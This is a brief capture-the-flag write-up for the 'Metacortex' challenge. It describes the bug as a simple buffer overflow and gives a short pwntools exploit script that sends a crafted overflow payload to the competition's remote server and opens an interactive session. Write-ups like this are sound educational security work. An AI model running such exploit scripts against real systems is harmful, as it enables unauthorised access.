### Metacortex (100 Points)

> This company is one of the top software companies in the world, because every single employee knows that they are part of a whole. Thus, if an employee has a problem, the company has a problem.
>
> [attachment](metacortex-72ec7dee20d0b191fe14dc2480bd3f43)

Just simple BOF.

#### exp script

``` python
from pwn import *
context.log_level='debug'
payload = p32(0x2333)+'\x00'*80+p64(0x3)

#p = process('./metacortex-72ec7dee20d0b191fe14dc2480bd3f43')
p = remote('chal.ctf.b01lers.com',1014)
#gdb.attach(p)
p.sendline(payload)

p.interactive()
```

